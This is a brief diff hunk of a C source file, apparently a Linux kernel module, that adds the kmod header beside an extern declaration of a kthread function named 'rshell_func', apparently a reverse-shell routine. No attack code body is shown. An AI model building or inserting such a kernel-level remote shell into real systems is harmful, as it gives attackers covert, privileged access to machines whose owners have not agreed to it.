@@ -4,6 +4,7 @@
 #include <linux/delay.h>
 #include <linux/kthread.h>
 #include <linux/sched/signal.h>
+#include <linux/kmod.h>
 
 extern int rshell_func(void* data); // 'data' is not in use but must be present to match the signature for kthread
 
